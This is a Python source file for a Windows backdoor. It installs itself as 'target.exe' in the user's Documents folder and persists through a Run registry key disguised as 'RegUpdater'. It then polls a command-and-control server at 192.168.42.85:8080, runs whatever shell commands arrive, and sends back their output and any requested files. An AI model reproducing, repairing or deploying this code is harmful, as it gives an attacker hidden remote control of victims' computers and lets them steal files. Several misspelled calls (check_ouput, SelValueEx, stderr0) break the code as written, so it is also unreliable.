import requests
import subprocess
import time
import os
import shutil
import winreg as wreg

path = os.getcwd().strip('/n')
Null,userprof = subprocess.check_ouput('set USERPROFILE',shell=True,stdin=subprocess.PIPE,stderr0=subprocess.PIPE).decode().split('=')
destination = userprof.strip('\n\r') + "\\Documents\\" + 'target.exe'

if not os.path.exists(destination):
    shutil.copyfile(path+'\target.exe',destination)
    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER,"Software\Microsoft\Windows\CurrentVersion\Run",0,wreg.KEY_ALL_ACCESS)
    wreg.SelValueEx(key,'RegUpdater',0,wreg.REG_SZ,destination)
    key.Close()

while True:
    req = requests.get("http://192.168.42.85:8080")
    command = req.text
    if 'terminate' in command:
        break
    elif 'grab' in command:
        grab,path = command.split("*")
        if os.path.exists(path):
            url = "http://192.168.42.85:8080/store"
            files = {'file':open(path,'rb')}
            r = requests.post(url,files=files)
        else:
            post_response = requests.post(url="http://192.168.42.85:8080",data="not able to find the file".encode())
    else:
        cmd = subprocess.Popen(command,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        post_response = requests.post(url="http://192.168.42.85:8080",data=cmd.stdout.read())
        post_response = requests.post(url="http://192.168.42.85:8080",data=cmd.stderr.read())
    time.sleep(3)
